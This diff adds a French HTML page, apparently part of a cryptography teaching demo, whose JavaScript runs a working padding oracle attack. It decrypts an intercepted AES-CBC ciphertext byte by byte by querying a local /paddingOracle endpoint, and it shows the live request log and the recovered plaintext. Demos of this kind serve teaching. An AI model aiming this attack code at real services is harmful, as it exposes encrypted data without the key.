@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attaque Oracle — Padding Oracle</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0a0a12; --panel: #10101e; --border: #1e1e38;
+      --text: #c0c0e0; --dim: #555570;
+      --green: #2dff88; --red: #ff3355; --blue: #4488ff; --yellow: #ffcc22;
+      --purple: #aa55ff;
+    }
+    body { font-family: 'JetBrains Mono', monospace; background: var(--bg); color: var(--text); min-height: 100vh; }
+
+    nav {
+      display: flex; border-bottom: 1px solid var(--border); padding: 0 32px;
+    }
+    nav a {
+      display: block; padding: 16px 20px; font-size: .78rem;
+      text-decoration: none; color: var(--dim); border-bottom: 2px solid transparent; transition: color .15s;
+    }
+    nav a.active { color: var(--red); border-bottom-color: var(--red); }
+    nav a:hover { color: var(--text); }
+
+    main { max-width: 860px; margin: 0 auto; padding: 32px 20px; display: flex; flex-direction: column; gap: 24px; }
+
+    h1 { font-size: 1rem; font-weight: 600; color: var(--red); margin-bottom: 4px; }
+    .sub { font-size: .72rem; color: var(--dim); }
+
+    .card { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; padding: 20px; display: flex; flex-direction: column; gap: 14px; }
+    .card h2 { font-size: .82rem; font-weight: 600; }
+
+    label { font-size: .62rem; color: var(--dim); text-transform: uppercase; letter-spacing: .07em; }
+    .field { display: flex; flex-direction: column; gap: 5px; }
+    .row { display: flex; gap: 8px; align-items: flex-end; }
+    .row .field { flex: 1; }
+
+    input[type="text"] {
+      background: var(--bg); border: 1px solid var(--border); color: var(--text);
+      font-family: inherit; font-size: .78rem; padding: 9px 12px; border-radius: 3px;
+      width: 100%; outline: none; transition: border-color .15s;
+    }
+    input:focus { border-color: var(--blue); }
+
+    button {
+      background: transparent; border: 1px solid var(--border); color: var(--text);
+      font-family: inherit; font-size: .78rem; padding: 9px 16px;
+      cursor: pointer; border-radius: 3px; white-space: nowrap; transition: all .15s;
+    }
+    button.danger { border-color: var(--red); color: var(--red); }
+    button.danger:hover { background: var(--red); color: var(--bg); }
+    button.stop { border-color: var(--yellow); color: var(--yellow); }
+    button.stop:hover { background: var(--yellow); color: var(--bg); }
+    button:disabled { opacity: .3; cursor: not-allowed; }
+
+    /* Explication algo */
+    .algo {
+      font-size: .72rem; color: var(--dim); line-height: 2;
+      border-left: 2px solid var(--border); padding-left: 14px;
+    }
+    .algo code { color: var(--blue); }
+    .algo strong { color: var(--text); }
+
+    /* Statuts */
+    .stats {
+      display: flex; flex-wrap: wrap; gap: 20px;
+      background: var(--bg); border: 1px solid var(--border);
+      border-radius: 3px; padding: 12px 16px;
+    }
+    .stat .lbl { font-size: .6rem; color: var(--dim); text-transform: uppercase; letter-spacing: .07em; }
+    .stat .val { font-size: .9rem; font-weight: 600; color: var(--green); }
+
+    /* Barre de progression */
+    .pbar { height: 3px; background: var(--border); border-radius: 2px; overflow: hidden; }
+    .pbar-fill { height: 100%; background: var(--green); width: 0; transition: width .2s; }
+
+    /* Texte récupéré */
+    .recovered {
+      background: var(--bg); border: 1px solid var(--border); border-radius: 3px;
+      padding: 10px 14px; font-size: .88rem; min-height: 36px; word-break: break-all;
+    }
+    .rc-done { color: var(--green); }
+    .rc-pending { color: var(--dim); }
+
+    /* Journal réseau */
+    .net-log {
+      background: #06060f; border: 1px solid var(--border); border-radius: 3px;
+      padding: 10px 14px; height: 320px; overflow-y: auto;
+      font-size: .68rem; line-height: 1.9;
+    }
+    .net-log .log-header {
+      color: var(--dim); font-size: .6rem; border-bottom: 1px solid var(--border);
+      padding-bottom: 6px; margin-bottom: 6px;
+      display: grid; grid-template-columns: 55px 130px 1fr 55px 55px;
+    }
+    .log-row {
+      display: grid; grid-template-columns: 55px 130px 1fr 55px 55px;
+      border-bottom: 1px solid #1a1a28; padding: 1px 0;
+    }
+    .log-row.ok  { background: rgba(45, 255, 136, .04); }
+    .log-row.fail { color: var(--dim); }
+    .log-row .c-req   { color: var(--dim); }
+    .log-row .c-verb  { color: var(--purple); }
+    .log-row .c-hex   { color: var(--blue); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .log-row .c-200   { color: var(--green); font-weight: 600; }
+    .log-row .c-403   { color: var(--red); }
+    .log-row .c-found { color: var(--green); font-weight: 600; }
+
+    /* Résultat final */
+    .result-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .result-item { display: flex; flex-direction: column; gap: 6px; }
+    .ptxt {
+      background: var(--bg); border: 1px solid var(--border); border-radius: 3px;
+      padding: 10px 14px; font-size: .88rem; min-height: 36px; word-break: break-all;
+    }
+    .ptxt.match { border-color: var(--green); color: var(--green); }
+
+    /* Alerte intercepté */
+    .intercepted-banner {
+      display: flex; align-items: center; gap: 12px;
+      background: rgba(255, 51, 85, .08); border: 1px solid var(--red);
+      border-radius: 4px; padding: 12px 16px; font-size: .75rem;
+    }
+    .intercepted-banner .icon { color: var(--red); font-size: 1.2rem; }
+    .intercepted-banner .hex { color: var(--blue); font-size: .7rem; word-break: break-all; margin-top: 4px; }
+
+    .hidden { display: none !important; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a href="index.html">🔒 Interception</a>
+  <a href="attaque.html" class="active">⚔️ Attaque oracle</a>
+</nav>
+
+<main>
+
+  <div>
+    <h1>Étape 2 — Attaque Padding Oracle</h1>
+    <p class="sub">Sans connaître la clé, l'attaquant interroge l'oracle octet par octet et reconstruit le clair.</p>
+  </div>
+
+  <!-- Ciphertext intercepté -->
+  <div id="bannerIntercepted" class="intercepted-banner hidden">
+    <span class="icon">⚡</span>
+    <div>
+      <div>Message intercepté chargé depuis l'étape 1</div>
+      <div class="hex" id="bannerHex"></div>
+    </div>
+  </div>
+
+  <!-- Saisie manuelle si pas de localStorage -->
+  <div class="card">
+    <h2>Texte chiffré cible</h2>
+    <div class="row">
+      <div class="field">
+        <label>Hex (IV inclus)</label>
+        <input type="text" id="ctInput" placeholder="Coller ici ou revenir à l'étape 1…">
+      </div>
+    </div>
+    <div style="font-size: .68rem; color: var(--dim);">
+      ← Utilisez le bouton <em>Envoyer au craqueur</em> de la page Interception pour remplir automatiquement.
+    </div>
+  </div>
+
+  <!-- Explication algo -->
+  <div class="card">
+    <h2>Principe de l'attaque</h2>
+    <div class="algo">
+      Pour chaque octet <code>P[i]</code> du clair, l'attaquant modifie l'octet correspondant du bloc précédent <code>C[i-1]</code>
+      et teste les 256 valeurs possibles (0x00 → 0xFF).<br>
+      Quand l'oracle répond <strong>200</strong>, il sait que le padding est valide.
+      Il en déduit la valeur intermédiaire <code>interm[i] = b ⊕ pad_cible</code>,
+      puis le clair <code>P[i] = interm[i] ⊕ C[i-1]</code>.<br>
+      Coût : <strong>~128 requêtes par octet</strong> en moyenne.
+    </div>
+  </div>
+
+  <!-- Contrôles -->
+  <div class="card">
+    <h2>Exécution de l'attaque</h2>
+    <div class="row">
+      <button class="danger" id="btnLancer" onclick="lancerAttaque()">⚔️ Lancer l'attaque</button>
+      <button class="stop hidden" id="btnStop" onclick="arreter()">⏹ Arrêter</button>
+    </div>
+
+    <div id="zone" class="hidden">
+      <!-- Stats -->
+      <div class="stats">
+        <div class="stat">
+          <div class="lbl">Bloc</div>
+          <div class="val" id="sBloc">—</div>
+        </div>
+        <div class="stat">
+          <div class="lbl">Octet testé</div>
+          <div class="val" id="sOctet">—</div>
+        </div>
+        <div class="stat">
+          <div class="lbl">Valeur b</div>
+          <div class="val" id="sB">—</div>
+        </div>
+        <div class="stat">
+          <div class="lbl">Requêtes</div>
+          <div class="val" id="sReq">0</div>
+        </div>
+        <div class="stat">
+          <div class="lbl">Progression</div>
+          <div class="val" id="sPct">0%</div>
+        </div>
+      </div>
+      <div class="pbar"><div class="pbar-fill" id="pbar"></div></div>
+
+      <!-- Texte récupéré -->
+      <div class="field">
+        <label>Clair récupéré (en temps réel)</label>
+        <div class="recovered" id="recDisplay"></div>
+      </div>
+
+      <!-- Journal réseau -->
+      <div class="field">
+        <label>Journal des requêtes oracle (POST /paddingOracle)</label>
+        <div class="net-log" id="netLog">
+          <div class="log-header">
+            <span>req #</span>
+            <span>endpoint</span>
+            <span>payload (iv+c hex)</span>
+            <span>HTTP</span>
+            <span>résultat</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Résultat final -->
+    <div id="zoneResult" class="hidden">
+      <div class="result-grid">
+        <div class="result-item">
+          <label>Message original</label>
+          <div class="ptxt" id="origMsg"></div>
+        </div>
+        <div class="result-item">
+          <label>Récupéré par l'attaque</label>
+          <div class="ptxt" id="recMsg"></div>
+        </div>
+      </div>
+      <div class="stats" style="margin-top: 12px;">
+        <div class="stat">
+          <div class="lbl">Requêtes totales</div>
+          <div class="val" id="rReq">—</div>
+        </div>
+        <div class="stat">
+          <div class="lbl">Clé AES utilisée</div>
+          <div class="val" style="color: var(--red)">inconnue</div>
+        </div>
+        <div class="stat">
+          <div class="lbl">Résultat</div>
+          <div class="val" id="rMatch">—</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<script>
+  const API = 'http://localhost:5001';
+
+  // Chargement depuis localStorage (étape 1)
+  const interceptedCt  = localStorage.getItem('intercepted_ct')  || '';
+  const interceptedMsg = localStorage.getItem('original_msg')     || '';
+
+  if (interceptedCt) {
+    document.getElementById('ctInput').value = interceptedCt;
+    document.getElementById('bannerHex').textContent = interceptedCt;
+    document.getElementById('bannerIntercepted').classList.remove('hidden');
+  }
+
+  // --- Utils ---
+
+  function hexToBytes(hex) {
+    const b = new Uint8Array(hex.length >> 1);
+    for (let i = 0; i < hex.length; i += 2)
+      b[i >> 1] = parseInt(hex.slice(i, i + 2), 16);
+    return b;
+  }
+
+  function bytesToHex(bytes) {
+    return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
+  }
+
+  function byteToChar(b) {
+    return (b >= 0x20 && b < 0x7f) ? String.fromCharCode(b) : '·';
+  }
+
+  async function post(endpoint, body) {
+    return fetch(API + endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+  }
+
+  // --- Affichage journal ---
+
+  let logQueue = [];
+  let logFlushPending = false;
+
+  function pushLog(reqNum, hexPayload, status, found, foundChar) {
+    logQueue.push({ reqNum, hexPayload, status, found, foundChar });
+    if (!logFlushPending) {
+      logFlushPending = true;
+      requestAnimationFrame(flushLog);
+    }
+  }
+
+  function flushLog() {
+    logFlushPending = false;
+    const log = document.getElementById('netLog');
+    const frag = document.createDocumentFragment();
+
+    for (const e of logQueue) {
+      const row = document.createElement('div');
+      row.className = 'log-row ' + (e.status === 200 ? 'ok' : 'fail');
+
+      // Tronquer le hex pour l'affichage
+      const hexShort = e.hexPayload.slice(0, 24) + '…';
+
+      row.innerHTML =
+        `<span class="c-req">#${e.reqNum}</span>` +
+        `<span class="c-verb">POST /paddingOracle</span>` +
+        `<span class="c-hex" title="${e.hexPayload}">${hexShort}</span>` +
+        `<span class="${e.status === 200 ? 'c-200' : 'c-403'}">${e.status}</span>` +
+        `<span class="${e.found ? 'c-found' : ''}">${e.found ? `'${e.foundChar}' ✓` : '✗'}</span>`;
+
+      frag.appendChild(row);
+    }
+
+    logQueue = [];
+    log.appendChild(frag);
+    log.scrollTop = log.scrollHeight;
+  }
+
+  // --- Attaque ---
+
+  let running = false;
+  let totalReq = 0;
+  const recMap = new Map();
+
+  function arreter() { running = false; }
+
+  function updateStats(bi, numBlocs, bytePos, totalBytes, b) {
+    document.getElementById('sBloc').textContent  = `${bi}/${numBlocs}`;
+    document.getElementById('sOctet').textContent = `${16 - bytePos}/16`;
+    document.getElementById('sB').textContent     = `0x${b.toString(16).padStart(2, '0')}`;
+    document.getElementById('sReq').textContent   = totalReq;
+    const done = (bi - 1) * 16 + (16 - bytePos);
+    const pct  = Math.round(done / totalBytes * 100);
+    document.getElementById('sPct').textContent   = pct + '%';
+    document.getElementById('pbar').style.width   = pct + '%';
+  }
+
+  function updateDisplay(totalBytes) {
+    let html = '';
+    for (let i = 0; i < totalBytes; i++) {
+      html += recMap.has(i)
+        ? `<span class="rc-done">${byteToChar(recMap.get(i))}</span>`
+        : `<span class="rc-pending">_</span>`;
+    }
+    document.getElementById('recDisplay').innerHTML = html;
+  }
+
+  async function oracle(modPrev, ctBlock, bi, bytePos, b) {
+    totalReq++;
+    document.getElementById('sReq').textContent = totalReq;
+    const payload = bytesToHex(new Uint8Array([...modPrev, ...ctBlock]));
+    const r = await post('/paddingOracle', { ciphertext: payload });
+    const ok = r.status === 200;
+    // Logger toutes les requêtes (avec la réponse HTTP explicite)
+    pushLog(totalReq, payload, r.status, false, '');
+    return ok;
+  }
+
+  async function oracleOk(modPrev, ctBlock, foundChar) {
+    // Appelé quand on a trouvé un octet — met à jour le log de la dernière entrée
+    const log = document.getElementById('netLog');
+    if (log.lastElementChild && log.lastElementChild.className.includes('log-row')) {
+      const last = log.lastElementChild;
+      last.querySelector('.c-found, .c-403').textContent = `'${foundChar}' ✓`;
+      last.querySelector('.c-found, .c-403').className   = 'c-found';
+    }
+  }
+
+  async function lancerAttaque() {
+    const hex = document.getElementById('ctInput').value.trim();
+    if (!hex || hex.length < 64 || hex.length % 32 !== 0) {
+      alert('Hex invalide. Longueur attendue : multiple de 32 caractères (IV + au moins 1 bloc).');
+      return;
+    }
+
+    // Reset
+    running   = true;
+    totalReq  = 0;
+    recMap.clear();
+    document.getElementById('btnLancer').disabled = true;
+    document.getElementById('btnStop').classList.remove('hidden');
+    document.getElementById('zoneResult').classList.add('hidden');
+    document.getElementById('zone').classList.remove('hidden');
+    // Vider le log (garder l'en-tête)
+    const netLog = document.getElementById('netLog');
+    netLog.innerHTML = `<div class="log-header">
+      <span>req #</span><span>endpoint</span><span>payload (iv+c hex)</span><span>HTTP</span><span>résultat</span>
+    </div>`;
+
+    const allBytes    = hexToBytes(hex);
+    const numBlocks   = allBytes.length / 16;
+    const numCtBlocks = numBlocks - 1;
+    const totalBytes  = numCtBlocks * 16;
+
+    const blocks = [];
+    for (let i = 0; i < numBlocks; i++)
+      blocks.push(allBytes.slice(i * 16, (i + 1) * 16));
+
+    updateDisplay(totalBytes);
+
+    outer: for (let bi = 1; bi <= numCtBlocks; bi++) {
+      if (!running) break;
+      const ctBlock  = blocks[bi];
+      const prevOrig = blocks[bi - 1];
+      const interm   = new Uint8Array(16);
+
+      for (let bytePos = 15; bytePos >= 0; bytePos--) {
+        if (!running) break outer;
+
+        const targetPad = 16 - bytePos;
+
+        for (let b = 0; b <= 255; b++) {
+          if (!running) break;
+
+          updateStats(bi, numCtBlocks, bytePos, totalBytes, b);
+
+          const modPrev = new Uint8Array(prevOrig);
+          modPrev[bytePos] = b;
+          for (let p = bytePos + 1; p < 16; p++)
+            modPrev[p] = interm[p] ^ targetPad;
+
+          if (!await oracle(modPrev, ctBlock, bi, bytePos, b)) continue;
+
+          // Anti-faux-positif (dernier octet)
+          if (bytePos === 15) {
+            const check = new Uint8Array(modPrev);
+            check[14] ^= 0x01;
+            if (!await oracle(check, ctBlock, bi, bytePos, b)) continue;
+          }
+
+          interm[bytePos]   = b ^ targetPad;
+          const plainByte   = interm[bytePos] ^ prevOrig[bytePos];
+          const plainChar   = byteToChar(plainByte);
+
+          const absPos = (bi - 1) * 16 + bytePos;
+          recMap.set(absPos, plainByte);
+          updateDisplay(totalBytes);
+
+          // Marquer le succès dans le log
+          // Supprimer la dernière entrée (403) et ajouter une entrée 200 marquée
+          const lastRow = netLog.querySelector('.log-row:last-child');
+          if (lastRow) {
+            const cols = lastRow.querySelectorAll('span');
+            if (cols[3]) { cols[3].textContent = '200'; cols[3].className = 'c-200'; }
+            if (cols[4]) { cols[4].textContent = `'${plainChar}' ✓`; cols[4].className = 'c-found'; }
+            lastRow.className = 'log-row ok';
+          }
+          break;
+        }
+      }
+    }
+
+    // Assemblage + suppression padding PKCS#7
+    const raw = [];
+    for (let i = 0; i < totalBytes; i++)
+      raw.push(recMap.has(i) ? recMap.get(i) : 0x3f);
+
+    let trimmed = [...raw];
+    const padVal = trimmed[trimmed.length - 1];
+    if (padVal >= 1 && padVal <= 16 && trimmed.slice(-padVal).every(v => v === padVal))
+      trimmed = trimmed.slice(0, -padVal);
+
+    const recovered = new TextDecoder().decode(new Uint8Array(trimmed));
+    const match     = running && recovered === interceptedMsg;
+
+    document.getElementById('origMsg').textContent  = interceptedMsg || '(non disponible)';
+    document.getElementById('recMsg').textContent   = recovered;
+    document.getElementById('recMsg').className     = 'ptxt' + (match ? ' match' : '');
+    document.getElementById('rReq').textContent     = totalReq;
+    document.getElementById('rMatch').textContent   = match ? 'Identique ✓' : 'Différent ✗';
+    document.getElementById('rMatch').style.color   = match ? 'var(--green)' : 'var(--red)';
+    document.getElementById('zoneResult').classList.remove('hidden');
+
+    document.getElementById('btnLancer').disabled = false;
+    document.getElementById('btnStop').classList.add('hidden');
+    running = false;
+  }
+</script>
+</body>
+</html>
